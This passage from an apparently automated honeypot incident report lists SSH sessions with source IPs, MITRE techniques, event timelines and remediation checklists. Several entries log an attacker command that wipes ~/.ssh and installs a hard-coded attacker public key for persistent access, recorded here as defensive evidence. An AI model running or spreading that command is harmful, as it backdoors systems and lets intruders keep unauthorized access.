| `2026-05-21 18:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.78[.]131` to AbuseIPDB if not already reported
- [ ] Block `46.8.78[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00904c5e421b

| Field | Detail |
|---|---|
| **Source IP** | `46.8.78[.]131` |
| **First Seen** | 2026-05-21 18:40 |
| **Last Seen** | 2026-05-21 18:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:40:50` | `cowrie.session.connect` |
| `2026-05-21 18:40:50` | `cowrie.client.version` |
| `2026-05-21 18:40:51` | `cowrie.client.kex` |
| `2026-05-21 18:40:52` | `cowrie.login.success` |
| `2026-05-21 18:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.78[.]131` to AbuseIPDB if not already reported
- [ ] Block `46.8.78[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3001b38eed2f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 18:40 |
| **Last Seen** | 2026-05-21 18:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:40:59` | `cowrie.session.connect` |
| `2026-05-21 18:40:59` | `cowrie.client.version` |
| `2026-05-21 18:40:59` | `cowrie.client.kex` |
| `2026-05-21 18:40:59` | `cowrie.login.success` |
| `2026-05-21 18:40:59` | `cowrie.session.params` |
| `2026-05-21 18:40:59` | `cowrie.command.input` |
| `2026-05-21 18:40:59` | `cowrie.command.failed` |
| `2026-05-21 18:41:00` | `cowrie.log.closed` |
| `2026-05-21 18:41:00` | `cowrie.session.params` |
| `2026-05-21 18:41:00` | `cowrie.command.input` |
| `2026-05-21 18:41:00` | `cowrie.session.file_download` |
| `2026-05-21 18:41:00` | `cowrie.log.closed` |
| `2026-05-21 18:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d1223fb49a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 18:41 |
| **Last Seen** | 2026-05-21 18:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:41:02` | `cowrie.session.connect` |
| `2026-05-21 18:41:02` | `cowrie.client.version` |
| `2026-05-21 18:41:02` | `cowrie.client.kex` |
| `2026-05-21 18:41:02` | `cowrie.login.success` |
| `2026-05-21 18:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aadb79d43e33

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 18:44 |
| **Last Seen** | 2026-05-21 18:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:44:46` | `cowrie.session.connect` |
| `2026-05-21 18:44:46` | `cowrie.client.version` |
| `2026-05-21 18:44:46` | `cowrie.client.kex` |
| `2026-05-21 18:44:46` | `cowrie.login.success` |
| `2026-05-21 18:44:46` | `cowrie.session.params` |
| `2026-05-21 18:44:46` | `cowrie.command.input` |
| `2026-05-21 18:44:46` | `cowrie.command.failed` |
| `2026-05-21 18:44:46` | `cowrie.log.closed` |
| `2026-05-21 18:44:46` | `cowrie.session.params` |
| `2026-05-21 18:44:46` | `cowrie.command.input` |
| `2026-05-21 18:44:46` | `cowrie.session.file_download` |
| `2026-05-21 18:44:46` | `cowrie.log.closed` |
| `2026-05-21 18:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1fe2d75e87

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 18:44 |
| **Last Seen** | 2026-05-21 18:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:44:47` | `cowrie.session.connect` |
| `2026-05-21 18:44:47` | `cowrie.client.version` |
| `2026-05-21 18:44:47` | `cowrie.client.kex` |
| `2026-05-21 18:44:48` | `cowrie.login.success` |
| `2026-05-21 18:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b68ae51d2a

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 18:51 |
| **Last Seen** | 2026-05-21 18:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:51:21` | `cowrie.session.connect` |
| `2026-05-21 18:51:21` | `cowrie.client.version` |
| `2026-05-21 18:51:21` | `cowrie.client.kex` |
| `2026-05-21 18:51:21` | `cowrie.login.success` |
| `2026-05-21 18:51:21` | `cowrie.session.params` |
| `2026-05-21 18:51:21` | `cowrie.command.input` |
| `2026-05-21 18:51:21` | `cowrie.command.failed` |
| `2026-05-21 18:51:21` | `cowrie.log.closed` |
| `2026-05-21 18:51:21` | `cowrie.session.params` |
| `2026-05-21 18:51:21` | `cowrie.command.input` |
| `2026-05-21 18:51:21` | `cowrie.session.file_download` |
| `2026-05-21 18:51:21` | `cowrie.log.closed` |
| `2026-05-21 18:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749ae485483b

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 18:51 |
| **Last Seen** | 2026-05-21 18:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:51:22` | `cowrie.session.connect` |
| `2026-05-21 18:51:22` | `cowrie.client.version` |
| `2026-05-21 18:51:22` | `cowrie.client.kex` |
| `2026-05-21 18:51:23` | `cowrie.login.success` |
| `2026-05-21 18:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f201919071d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 18:52 |
| **Last Seen** | 2026-05-21 18:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:52:20` | `cowrie.session.connect` |
| `2026-05-21 18:52:20` | `cowrie.client.version` |
| `2026-05-21 18:52:21` | `cowrie.client.kex` |
| `2026-05-21 18:52:21` | `cowrie.login.success` |
| `2026-05-21 18:52:21` | `cowrie.session.params` |
| `2026-05-21 18:52:21` | `cowrie.command.input` |
| `2026-05-21 18:52:21` | `cowrie.command.failed` |
| `2026-05-21 18:52:21` | `cowrie.log.closed` |
| `2026-05-21 18:52:22` | `cowrie.session.params` |
| `2026-05-21 18:52:22` | `cowrie.command.input` |
| `2026-05-21 18:52:22` | `cowrie.session.file_download` |
| `2026-05-21 18:52:22` | `cowrie.log.closed` |
| `2026-05-21 18:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-943ee73b7d85

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 18:52 |
| **Last Seen** | 2026-05-21 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:52:23` | `cowrie.session.connect` |
| `2026-05-21 18:52:23` | `cowrie.client.version` |
| `2026-05-21 18:52:24` | `cowrie.client.kex` |
| `2026-05-21 18:52:24` | `cowrie.login.success` |
| `2026-05-21 18:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a355c4bb97f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 19:03 |
| **Last Seen** | 2026-05-21 19:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:03:50` | `cowrie.session.connect` |
| `2026-05-21 19:03:50` | `cowrie.client.version` |
| `2026-05-21 19:03:50` | `cowrie.client.kex` |
| `2026-05-21 19:03:50` | `cowrie.login.success` |
| `2026-05-21 19:03:50` | `cowrie.session.params` |
| `2026-05-21 19:03:50` | `cowrie.command.input` |
| `2026-05-21 19:03:50` | `cowrie.command.failed` |
| `2026-05-21 19:03:50` | `cowrie.log.closed` |
| `2026-05-21 19:03:51` | `cowrie.session.params` |
| `2026-05-21 19:03:51` | `cowrie.command.input` |
| `2026-05-21 19:03:51` | `cowrie.session.file_download` |
| `2026-05-21 19:03:51` | `cowrie.log.closed` |
| `2026-05-21 19:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d15661c55d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 19:03 |
| **Last Seen** | 2026-05-21 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:03:53` | `cowrie.session.connect` |
| `2026-05-21 19:03:53` | `cowrie.client.version` |
| `2026-05-21 19:03:53` | `cowrie.client.kex` |
| `2026-05-21 19:03:53` | `cowrie.login.success` |
| `2026-05-21 19:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-398d765c1502

| Field | Detail |
|---|---|
| **Source IP** | `182.180.59[.]208` |
| **First Seen** | 2026-05-21 19:06 |
| **Last Seen** | 2026-05-21 19:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:06:44` | `cowrie.session.connect` |
| `2026-05-21 19:06:44` | `cowrie.client.version` |
| `2026-05-21 19:06:44` | `cowrie.client.kex` |
| `2026-05-21 19:06:44` | `cowrie.login.success` |
| `2026-05-21 19:06:45` | `cowrie.session.params` |
| `2026-05-21 19:06:45` | `cowrie.command.input` |
| `2026-05-21 19:06:45` | `cowrie.command.failed` |
| `2026-05-21 19:06:45` | `cowrie.log.closed` |
| `2026-05-21 19:06:45` | `cowrie.session.params` |
| `2026-05-21 19:06:45` | `cowrie.command.input` |
| `2026-05-21 19:06:45` | `cowrie.session.file_download` |
| `2026-05-21 19:06:45` | `cowrie.log.closed` |
| `2026-05-21 19:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.180.59[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.180.59[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08dd81adf4ba

| Field | Detail |
|---|---|
| **Source IP** | `182.180.59[.]208` |
| **First Seen** | 2026-05-21 19:06 |
| **Last Seen** | 2026-05-21 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:06:46` | `cowrie.session.connect` |
| `2026-05-21 19:06:46` | `cowrie.client.version` |
| `2026-05-21 19:06:47` | `cowrie.client.kex` |
| `2026-05-21 19:06:47` | `cowrie.login.success` |
| `2026-05-21 19:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.180.59[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.180.59[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2f9c1978c4

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 19:22 |
| **Last Seen** | 2026-05-21 19:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:22:48` | `cowrie.session.connect` |
| `2026-05-21 19:22:48` | `cowrie.client.version` |
| `2026-05-21 19:22:48` | `cowrie.client.kex` |
| `2026-05-21 19:22:49` | `cowrie.login.success` |
| `2026-05-21 19:22:49` | `cowrie.session.params` |
| `2026-05-21 19:22:49` | `cowrie.command.input` |
| `2026-05-21 19:22:49` | `cowrie.command.failed` |
| `2026-05-21 19:22:49` | `cowrie.log.closed` |
| `2026-05-21 19:22:49` | `cowrie.session.params` |
| `2026-05-21 19:22:49` | `cowrie.command.input` |
| `2026-05-21 19:22:49` | `cowrie.session.file_download` |
| `2026-05-21 19:22:49` | `cowrie.log.closed` |
| `2026-05-21 19:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25789bd2a854

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 19:22 |
| **Last Seen** | 2026-05-21 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:22:51` | `cowrie.session.connect` |
| `2026-05-21 19:22:51` | `cowrie.client.version` |
| `2026-05-21 19:22:51` | `cowrie.client.kex` |
| `2026-05-21 19:22:52` | `cowrie.login.success` |
| `2026-05-21 19:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9f2dfd6813d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 19:26 |
| **Last Seen** | 2026-05-21 19:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:26:49` | `cowrie.session.connect` |
| `2026-05-21 19:26:49` | `cowrie.client.version` |
| `2026-05-21 19:26:49` | `cowrie.client.kex` |
| `2026-05-21 19:26:50` | `cowrie.login.success` |
| `2026-05-21 19:26:50` | `cowrie.session.params` |
| `2026-05-21 19:26:50` | `cowrie.command.input` |
| `2026-05-21 19:26:50` | `cowrie.command.failed` |
| `2026-05-21 19:26:50` | `cowrie.log.closed` |
| `2026-05-21 19:26:50` | `cowrie.session.params` |
| `2026-05-21 19:26:50` | `cowrie.command.input` |
| `2026-05-21 19:26:50` | `cowrie.session.file_download` |
| `2026-05-21 19:26:50` | `cowrie.log.closed` |
| `2026-05-21 19:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c83d932ba4e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 19:26 |
| **Last Seen** | 2026-05-21 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:26:52` | `cowrie.session.connect` |
| `2026-05-21 19:26:52` | `cowrie.client.version` |
| `2026-05-21 19:26:52` | `cowrie.client.kex` |
| `2026-05-21 19:26:53` | `cowrie.login.success` |
| `2026-05-21 19:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e7a903218e

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 19:30 |
| **Last Seen** | 2026-05-21 19:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
